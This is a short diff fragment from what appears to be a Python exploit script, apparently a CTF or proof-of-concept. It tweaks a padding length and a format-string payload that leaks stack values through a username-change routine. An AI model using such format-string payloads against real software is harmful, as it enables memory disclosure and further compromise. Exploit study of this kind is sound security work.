@@ -80,9 +80,9 @@ def exploit() -> bool:
 
     io.recvuntil(b"> ")
 
-    payload = b"A" * (32 + 16)
+    payload = b"A" * (0x30 + 16)
     # payload += (b"%p." * 32)
-    payload += b"%c%c|%16$lx.%17$lx.%18$lx.%19$lx.%20$lx.%21$lx"
+    payload += b"|%18$lx.%19$lx.%20$lx.%21$lx.%22$lx.%23$lx"
     leaked = change_username(io, payload)
 
     # trimming
